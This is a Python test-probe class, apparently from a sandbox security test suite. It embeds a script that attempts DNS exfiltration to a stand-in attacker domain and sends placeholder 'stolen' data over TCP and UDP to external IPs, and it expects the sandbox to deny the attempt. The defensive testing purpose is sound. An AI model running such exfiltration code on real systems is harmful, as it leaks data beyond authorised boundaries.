from canaries.probe_base import ProbeBase, ProbeExpectation
from cindermote.mflog import get_logger

_log = get_logger("canaries.probe_outbound_exfil")

class OutboundExfilProbe(ProbeBase):
    @property
    def name(self) -> str:
        return "outbound_exfil"
        
    @property
    def description(self) -> str:
        return "Step 6: Arbitrary outbound data exfiltration"
        
    @property
    def source(self) -> str:
        return """\
\"\"\"Probe: arbitrary outbound connections (exfiltration attempt).\"\"\"
import socket

# Attempt DNS exfiltration
try:
    socket.getaddrinfo("exfil.attacker.example.com", 53)
except Exception:
    pass

# Attempt direct TCP to external hosts
targets = [
    ("1.1.1.1", 53),
    ("8.8.8.8", 53),
    ("93.184.216.34", 80),  # example.com
]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))
        s.send(b"EXFILTRATED_DATA")
        s.close()
    except Exception:
        pass

# Attempt UDP exfiltration
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"stolen_data", ("1.1.1.1", 53))
    s.close()
except Exception:
    pass

print("exfiltration_probe_complete")
"""

    @property
    def expectation(self) -> ProbeExpectation:
        return ProbeExpectation(risk="hostile", decision="DENY", rules=frozenset({"network_exfil_attempt"}))
